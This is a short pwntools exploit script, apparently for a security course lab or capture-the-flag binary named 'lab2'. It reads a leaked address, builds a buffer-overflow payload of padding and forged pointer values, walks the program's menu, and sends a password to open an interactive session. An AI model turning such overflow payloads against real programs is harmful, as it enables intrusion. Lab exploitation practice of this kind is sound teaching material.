from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
b 86
c
c
"""

if len(sys.argv) > 1:
    p = gdb.debug("./lab2", gdbscript=script, level="debug")
else:
    p = process("./lab2")

p.recvuntil("Here is a gift for you: 0x")
note_buf = int(p.recvline().strip(),16)
secret = note_buf-0x30
log.info(f"note_buf: {hex(note_buf)}")
log.info(f"secret: {hex(secret)}")

pl = flat(
    "A"*0x210,
    0, 0,
    0, 0,
    0, 0,
    0, secret,
    secret+0x10, 0,
    0, 0,
    0, 0,
    0
)

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "2")
p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "4")
p.sendline("gura_50_cu73\x00")

p.interactive()
